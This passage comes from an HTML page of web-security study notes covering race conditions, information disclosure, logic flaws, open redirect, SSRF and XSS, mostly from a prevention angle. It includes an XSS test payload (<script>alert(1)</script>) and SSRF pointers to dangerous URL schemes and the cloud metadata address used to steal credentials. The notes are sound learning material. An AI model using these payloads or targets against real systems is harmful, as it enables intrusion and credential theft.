                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">How to prevent Race condition vulnerability? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Avoid mixing data from different storage places.</li>
                      <li style="margin-bottom: 10px;">Ensure sensitive endpoints make state changes atomic by using the datastore's concurrency features.</li>
                      <li style="margin-bottom: 10px;">Take advantage of datastore integrity and consistency features like column uniqueness constraints.</li>
                      <li style="margin-bottom: 10px;"><strong>Synchronization Mechanisms:</strong> Use locks so only one thread can access shared resources at a time.</li>
                      <li style="margin-bottom: 10px;"><strong>Database Transactions:</strong> Group operations so they all succeed or all fail together.</li>
                    </ul>

                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 40px;">
                      <a href="https://www.notion.so/Attacks-2fa27bcaaa968013a23ecd828c1417dd?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups-2fa27bcaaa96803d90edc2c04f168ea7?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes-2fa27bcaaa96802da57bfc2ceda62401?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Tools-2fa27bcaaa968000a317ce6da67a1f35?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Information Disclosure
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>
              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">What is Information Disclosure? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Also known as <strong>information leakage.</strong></li>
                      <li style="margin-bottom: 10px;">When a web app unintentionally reveals sensitive information to its users.</li>
                      <li style="margin-bottom: 10px;">Depending on the context, websites may leak all kinds of information, including data about other users, sensitive commercial data, or technical details about the website and infrastructure.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">How do vulnerabilities arise? &rarr;</h3>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;"><strong>Failure to remove internal content:</strong> e.g., developer comments in production.</li>
                      <li style="margin-bottom: 10px;"><strong>Insecure configuration:</strong> failing to disable debugging/diagnostic features or overly verbose error messages.</li>
                      <li style="margin-bottom: 10px;"><strong>Flawed design:</strong> distinct responses in different error states allowing data enumeration.</li>
                    </ol>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Impact and Prevention &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Impact varies. Leaking sensitive user data has a direct, severe impact. Leaking technical data might be low impact initially, but could be chained to construct larger exploits.</li>
                      <li style="margin-bottom: 10px;"><strong>Prevention:</strong> Ensure everyone knows what data is sensitive. Audit code (strip comments). Use generic error messages. Disable debugging in production. Understand configuration settings.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Finding and Exploiting &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Fuzzing:</strong> Submitting unexpected data to see effects on responses.</li>
                      <li style="margin-bottom: 10px;"><strong>Scanners & Tools:</strong> Using automated scanners (e.g., Burp Scanner) to crawl and audit.</li>
                      <li style="margin-bottom: 10px;"><strong>Engineering informative responses:</strong> Manipulating input to extract arbitrary data via error messages.</li>
                      <li style="margin-bottom: 10px;"><strong>Common Sources:</strong> robots.txt, directory listings, comments, error messages, debug data, backup files, version control history.</li>
                    </ul>

                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 40px;">
                      <a href="https://www.notion.so/writeups-2fb27bcaaa968086900cf3269a77dcd5?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Logic Vulnerabilities
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>
              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">What is Business Logic Vulnerability? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Flaw in design and implementation of application, that allow attacker to elicit unintended behavior.</li>
                      <li style="margin-bottom: 10px;">This allows an attacker to manipulate legitimate functionalities to achieve malicious goals.</li>
                      <li style="margin-bottom: 10px;">These flaws are generally the result of failing to anticipate unusual application states.</li>
                      <li style="margin-bottom: 10px;">Identifying them often requires human knowledge, like understanding the business domain, making them difficult to detect with automated scanners.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Causes and Impact &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Causes:</strong> They arise because design teams make flawed assumptions about how users will interact. Developers may not fully understand the complicated system.</li>
                      <li style="margin-bottom: 10px;"><strong>Impact:</strong> Depends heavily on the functionality. Could be trivial, or could lead to massive financial losses, authentication bypass, or privilege escalation.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Prevention &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Understand the domain:</strong> Fully understand how the app works and what outcomes are valid.</li>
                      <li style="margin-bottom: 10px;"><strong>Avoid assumptions:</strong> Never assume users will behave normally. Validate server-side states.</li>
                      <li style="margin-bottom: 10px;"><strong>Clear design:</strong> Maintain clear workflow diagrams and document assumptions.</li>
                      <li style="margin-bottom: 10px;"><strong>Review dependencies:</strong> Understand side effects and how components interact.</li>
                    </ul>

                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 40px;">
                      <a href="https://www.notion.so/Examples-of-business-logic-vulnerabilities-2fe27bcaaa96806f8c0adbdad965b83f?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Examples <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups-2fe27bcaaa9680cd8cecf297562f44ce?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes-2fe27bcaaa9680fb9d0adab56231768c?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Open Redirect
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>
              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">What is Open Redirect? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Web security vulnerability where application redirect user to another URL, based on untrusted user input and without validation.</li>
                      <li style="margin-bottom: 10px;">Allows you to redirect the victim to a malicious website.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Redirection Types &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Server-Side Redirect:</strong> Implemented via HTTP response (3xx + Location header). Preferred and secure if validated.</li>
                      <li style="margin-bottom: 10px;"><strong>Client-Side Redirect:</strong> Performed using HTML or JavaScript. Less reliable, more abuse-prone.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Causes & Impact &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Causes:</strong> Using user-controlled input (e.g., <code>url</code>, <code>next</code>) in redirect logic without validation, assuming it's safe.</li>
                      <li style="margin-bottom: 10px;"><strong>Impact:</strong> Phishing attacks, credential theft, malware distribution, bypassing security controls (OAuth abuse). Typically low impact unless chained.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Prevention &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Avoid dynamic redirects when possible.</li>
                      <li style="margin-bottom: 10px;">Use an allowlist of approved destinations.</li>
                      <li style="margin-bottom: 10px;">Only allow relative paths.</li>
                      <li style="margin-bottom: 10px;">Validate and normalize values before use.</li>
                    </ul>

                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 40px;">
                      <a href="https://www.notion.so/Attacks-2ff27bcaaa968023bd88db008e6393c1?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/writeups-2ff27bcaaa968052ad08c925b41bc6df?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Server-Side Request Forgery - SSRF
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>
              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">What is SSRF? &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Web Security Vulnerability that allows an attacker to cause Server-Side Application to make a request to an unintended location (domain of the attacker's choosing).</li>
                      <li style="margin-bottom: 10px;">In a typical SSRF attack, the attacker might cause the server to connect to internal-only services within the organization's infrastructure.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Causes of SSRF &rarr;</h2>
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. Lack of input validation &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Accepting dangerous protocols (<code>file://</code>, <code>gopher://</code>, <code>dict://</code>).</li>
                      <li style="margin-bottom: 10px;">Allowing internal IP addresses, domains, and loopback.</li>
                      <li style="margin-bottom: 10px;">No destination restriction or flat network architecture.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. Over-Privileged Web Servers &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Web servers can access internal networks (internal only services).</li>
                      <li style="margin-bottom: 10px;">Internal services trust web server requests without authentication.</li>
                      <li style="margin-bottom: 10px;">Cloud metadata services are accessible from web servers.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Impact of SSRF &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Arbitrary command execution (RCE).</li>
                      <li style="margin-bottom: 10px;">Access to internal network, restricted endpoints, and unauthorized actions.</li>
                      <li style="margin-bottom: 10px;"><strong>Cloud metadata:</strong> Stealing credentials (like AWS access tokens from <code>169.254.169.254</code>).</li>
                      <li style="margin-bottom: 10px;"><strong>Reconnaissance:</strong> Port scanning internal networks.</li>
                      <li style="margin-bottom: 10px;"><strong>Denial of Service.</strong></li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Common Places to Look &rarr;</h2>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">Full URLs used in parameters.</li>
                      <li style="margin-bottom: 10px;">Hidden fields in forms.</li>
                      <li style="margin-bottom: 10px;">Partial URLs (hostname or path only).</li>
                      <li style="margin-bottom: 10px;">URLs within data formats (e.g., XML parsing leading to XXE/SSRF).</li>
                      <li style="margin-bottom: 10px;">SSRF via the Referer header in tracking analytics.</li>
                    </ol>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">Prevention &rarr;</h2>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Implement strict input validation and use an <strong>allowlist</strong> of trusted URLs.</li>
                      <li style="margin-bottom: 10px;">Implement security headers (CSP) and strong access controls for internal resources.</li>
                      <li style="margin-bottom: 10px;">Network segmentation and firewall rules to prevent outgoing requests to internal IPs.</li>
                    </ul>

                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 40px;">
                      <a href="https://www.notion.so/Study-Resources-25c27bcaaa96800a904af9ee2fcc7aa9?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Study Resources <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups-25627bcaaa96805ca4e8ea8daa46b88d?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes-25627bcaaa9680058d1ac0b43c90042d?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/SSRF-Attacks-25627bcaaa9680859618d9152578b08f?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">SSRF Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Tools-25b27bcaaa96802e8166fd86486706a9?pvs=21" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Tools <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

          </div>
        </article>

        <article class="section">
          <div class="section__title">
            <h2 class="section__title__text">
              Client-Side
            </h2>
            <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
          </div>

          <div class="section__text" style="background: rgba(115, 128, 206, 0.05); box-shadow: inset 0 2px 10px rgba(0,0,0,0.02); padding: 30px 25px 30px 45px; border-left: 5px solid #7380ce; border-radius: 0 12px 12px 0; margin-top: 15px;">
            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Cross-Site Scripting (XSS)
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; Cross-Site Scripting &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>&rarr; Client Side web vulnerability that allow attacker inject malicious script in webpage.</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">XSS is Client Side Vuln and the script executed by victim browser</li>
                    </ul>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;"><strong>&rarr; XSS occurs when a web application fails to properly validate or sanitize user input, allowing an attacker to execute arbitrary client-side code in the victimÃ¢â‚¬â„¢s browser.</strong></p>
                    </div>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Why XSS Happen &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1. Lack of Input Validation and sanitization &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The application <strong>doesnÃ¢â‚¬â„¢t properly check</strong> or restrict what the user inputs.</li>
                      <li style="margin-bottom: 10px;">Example: A comment box accepts <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> without blocking it.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2. Lack of Output Encoding &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The server <strong>prints untrusted input directly into HTML</strong>, without escaping special characters (<code>&lt;</code>, <code>&gt;</code>, <code>"</code>, etc.).</li>
                      <li style="margin-bottom: 10px;">Example: Putting user input directly into a web page like this:</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;script&gt;alert(1) &lt;/script&gt;</code>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3. Client-Side DOM Manipulation Without Sanitization &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">JavaScript code that directly injects user input into the DOM.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">4. Insecure Third-Party Scripts and libraries &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Using <strong>external scripts</strong> or <strong>insecure libraries</strong> that can be hijacked or already have XSS flaws.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">5. Incorrect Content-Type or CSP and x-content-type-options Headers &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Missing or misconfigured:
                        <ul style="padding-left: 20px; list-style-type: circle; margin-top: 5px;">
                          <li><code>Content-Type: text/html</code> (allows scripts to run unexpectedly)</li>
                          <li><code>Content-Security-Policy</code> (CSP not blocking inline scripts or external scripts)</li>
                        </ul>
                      </li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">6. Framework and language vulnerabilities &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">Some older web frameworks did not provide security mechanisms against XSS; others have unpatched XSS vulnerabilities. Modern web frameworks automatically escape XSS by design and promptly patch any discovered vulnerability.</p>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How Prevent XSS &rarr;</h2>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">1 &rarr; Validate &amp; sanitize Input ( Validate input on arrival ) &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">You should also validate input as strictly as possible at the point when it is first received from a user.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Examples of input validation include &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">If a user submits a URL that will be returned in responses, validating that it starts with a safe protocol such as HTTP and HTTPS. Otherwise someone might exploit your site with a harmful protocol like <code>javascript</code> or <code>data</code>.</li>
                      <li style="margin-bottom: 10px;">If a user supplies a value that it expected to be numeric, validating that the value actually contains an integer.</li>
                      <li style="margin-bottom: 10px;">Validating that input contains only an expected set of characters.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Input validation should generally employ whitelists rather than blacklists.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">For example, instead of trying to make a list of all harmful protocols (<code>javascript</code>, <code>data</code>, etc.), simply make a list of safe protocols (HTTP, HTTPS) and disallow anything not on the list. This will ensure your defense doesn't break when new harmful protocols appear and make it less susceptible to attacks that seek to obfuscate invalid values to evade a blacklist.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; Encode data on output &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Encoding should be applied directly before user-controllable data is written to a page, because the context you're writing into determines what kind of encoding you need to use.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; In an HTML context, you should convert non-whitelisted values into HTML entities &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><code>&lt;</code> converts to: <code>&amp;lt;</code></li>
                      <li style="margin-bottom: 10px;"><code>&gt;</code> converts to: <code>&amp;gt;</code></li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; In a JavaScript string context, non-alphanumeric values should be Unicode-escaped &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><code>&lt;</code> converts to: <code>\u003c</code></li>
                      <li style="margin-bottom: 10px;"><code>&gt;</code> converts to: <code>\u003e</code></li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; Sometimes you'll need to apply multiple layers of encoding, in the correct order. For example, to safely embed user input inside an event handler, you need to deal with both the JavaScript context and the HTML context. So you need to first Unicode-escape the input, and then HTML-encode it &rarr;</p>
